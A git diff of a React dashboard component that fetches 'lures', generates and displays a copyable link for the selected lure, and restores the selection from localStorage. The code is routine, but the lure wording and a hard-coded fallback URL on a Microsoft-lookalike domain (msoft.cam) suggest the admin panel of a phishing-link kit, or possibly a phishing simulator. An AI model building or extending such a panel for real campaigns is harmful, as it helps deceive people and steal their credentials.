@@ -203,45 +203,81 @@ export default function Dashboard() {
         // Get saved lure ID from localStorage if it exists
         const savedLureId = localStorage.getItem("selectedLureId");
 
-        // Also fetch all available lures
-        const [linkResponse, luresResponse] = await Promise.all([
-          fetch(
-            selectedLure
-              ? `/api/full-link?lureId=${selectedLure.id}`
-              : "/api/full-link"
-          ),
-          fetch("/api/lures"),
-        ]);
+        // Only fetch from API if we have a selected lure or a saved ID
+        if (selectedLure || savedLureId) {
+          const lureId = selectedLure?.id || savedLureId;
 
-        if (!linkResponse.ok) {
-          throw new Error("Failed to fetch link");
-        }
+          // Also fetch all available lures
+          const [linkResponse, luresResponse] = await Promise.all([
+            fetch(`/api/full-link?lureId=${lureId}`),
+            fetch("/api/lures"),
+          ]);
 
-        const data = await linkResponse.json();
-        setFullLink(data.fullUrl);
+          if (!linkResponse.ok) {
+            throw new Error("Failed to fetch link");
+          }
 
-        if (luresResponse.ok) {
-          const luresData = await luresResponse.json();
-          setLures(luresData.lures || []);
+          const data = await linkResponse.json();
+          // Only set the link if we have valid data and it's not the fallback URL
+          if (data.fullUrl && data.fullUrl !== "https://msoft.cam/wYyGBBeI") {
+            setFullLink(data.fullUrl);
+          }
 
-          // If we have lures
-          if (luresData.lures && luresData.lures.length > 0) {
-            // If we have a saved lure ID, try to find it
-            if (savedLureId) {
-              const savedLure = luresData.lures.find(
-                (lure) => lure.id === savedLureId
-              );
-              if (savedLure) {
-                setSelectedLure(savedLure);
-                return;
+          if (luresResponse.ok) {
+            const luresData = await luresResponse.json();
+            setLures(luresData.lures || []);
+
+            // If we have lures
+            if (luresData.lures && luresData.lures.length > 0) {
+              // If we have a saved lure ID, try to find it
+              if (savedLureId) {
+                const savedLure = luresData.lures.find(
+                  (lure) => lure.id === savedLureId
+                );
+                if (savedLure) {
+                  setSelectedLure(savedLure);
+
+                  // Fetch the specific lure URL if we restored from localStorage
+                  if (!selectedLure) {
+                    const index = luresData.lures.findIndex(
+                      (lure) => lure.id === savedLureId
+                    );
+                    if (index >= 0) {
+                      try {
+                        const lureUrlResponse = await fetch(
+                          `/api/lure-url?lureIndex=${index}`
+                        );
+                        if (lureUrlResponse.ok) {
+                          const urlData = await lureUrlResponse.json();
+                          if (
+                            urlData.url &&
+                            urlData.url !== "https://msoft.cam/wYyGBBeI"
+                          ) {
+                            setFullLink(urlData.url);
+                          }
+                        }
+                      } catch (error) {
+                        console.error(
+                          "Error fetching restored lure URL:",
+                          error
+                        );
+                      }
+                    }
+                  }
+                }
               }
             }
-
-            // If no selected lure and no saved ID (or saved ID not found), don't auto-select
-            if (!selectedLure) {
-              setSelectedLure(null);
-            }
           }
+        } else {
+          // If no lure is selected, just fetch the lures list
+          const luresResponse = await fetch("/api/lures");
+          if (luresResponse.ok) {
+            const luresData = await luresResponse.json();
+            setLures(luresData.lures || []);
+          }
+
+          // Clear the full link if no lure is selected
+          setFullLink("");
         }
       } catch (error) {
         console.error("Error fetching link:", error);
@@ -791,9 +827,13 @@ export default function Dashboard() {
               </div>
               <div className="text-gray-300 font-medium flex items-center space-x-2">
                 <span data-allow-select="true">
-                  {fullLink || "No active link generated"}
+                  {selectedLure && fullLink
+                    ? fullLink
+                    : selectedLure
+                    ? "Loading link..."
+                    : "No link selected"}
                 </span>
-                {fullLink && (
+                {selectedLure && fullLink && (
                   <button
                     onClick={() => copyToClipboard(fullLink)}
                     data-allow-context-menu="true"
